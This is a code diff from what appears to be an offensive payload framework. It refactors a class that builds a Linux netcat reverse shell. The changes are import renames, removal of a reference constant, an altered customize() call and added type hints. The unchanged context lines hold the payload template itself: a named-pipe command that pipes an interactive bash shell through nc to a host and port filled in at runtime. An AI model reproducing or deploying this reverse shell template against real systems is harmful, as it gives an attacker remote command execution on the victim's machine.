@@ -1,12 +1,11 @@
 import typing
 
 from core import payloadcore
-from shells import shellindex
+from shells import shellsindex
 
 
 class ReverseLinuxNetcat(payloadcore.Payload):
 
-    PAYLOADREF: str = "reverse/linux_netcat"
     AUTHOR: str = "Danakane"
 
     def __init__(self):
@@ -14,10 +13,9 @@ class ReverseLinuxNetcat(payloadcore.Payload):
                      b"|/bin/bash -i 2>&1|nc \x00\x00\x00\x00 " \
                      b"\x00\x00 >/tmp/f\0"
         super(ReverseLinuxNetcat, self).__init__()
-        self.customize(author=ReverseLinuxNetcat.AUTHOR, ref="reverse/linux_netcat",
-                       payloadbin=payloadbin, shellname=shellindex.ShellIndex.BASICREVERSE)
+        self.customize(payloadbin=payloadbin, shellref=shellsindex.ShellsIndex.basicreverse)
 
-    def parseparameters(self, host, port):
+    def parseparameters(self, host: str, port: int) -> bytes:
         host = host.encode()
         port = str(port).encode()
         payloadbin = self.binary()
@@ -27,4 +25,3 @@ class ReverseLinuxNetcat(payloadcore.Payload):
 
 
 blueprint: typing.Callable = ReverseLinuxNetcat
-name: str = ReverseLinuxNetcat.PAYLOADREF
